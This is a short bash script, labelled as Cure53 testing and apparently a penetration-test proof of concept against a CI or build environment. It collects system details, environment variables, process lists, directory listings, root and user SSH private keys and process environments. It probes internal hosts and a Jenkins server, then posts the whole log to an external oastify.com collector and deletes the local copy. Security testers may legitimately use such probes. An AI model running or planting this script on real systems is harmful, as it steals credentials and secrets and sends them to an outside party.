#!/usr/bin/env bash
apt update && apt install -y curl

LOG="$(mktemp)"
# Cure53 testing

echo "== system ==" >> "${LOG}"
id >> "${LOG}"
date >> "${LOG}"
uname -a >> "${LOG}"
ip addr >> "${LOG}"

echo "== env ==" >> "${LOG}"
env >> "${LOG}"

echo "== ps aux ==" >> "${LOG}"
ps aux >> "${LOG}"

echo "== ls Home ==" >> "${LOG}"
ls -lah ~/ >> "${LOG}"
ls -lah ~/* >> "${LOG}"

echo "== github ==" >> "${LOG}"
ssh git@github.com >> "${LOG}"

echo "== cat root ssh keys ==" >> "${LOG}"
cat ~/.ssh/* >> "${LOG}"

echo "== cat user ssh keys ==" >> "${LOG}"
cat /home/*/.ssh/* >> "${LOG}"

echo "== ls tmp ==" >> "${LOG}"
ls -lah /tmp/ >> "${LOG}"

echo "== proc ==" >> "${LOG}"
cat /proc/*/environ >> "${LOG}"

echo "== ls Root ==" >> "${LOG}"
ls -lah / >> "${LOG}"

echo "== nrm-vir-repository-01.priv.normation.com ==" >> "${LOG}"
curl --max-time 1 -v "http://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"
curl --max-time 1 -v "https://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"

echo "== ci.normation.com/jenkins/ ==" >> "${LOG}"
curl --max-time 1 -v "https://ci.normation.com/jenkins/" 2>&1 >> "${LOG}"

# send the collected log to the OAST endpoint
curl -s -X POST --data-binary @"${LOG}" "https://smiy3gt5e0ip7zzctxrkoif6axgo4js8.oastify.com/cure53_2"

# clean up
rm -f "${LOG}"
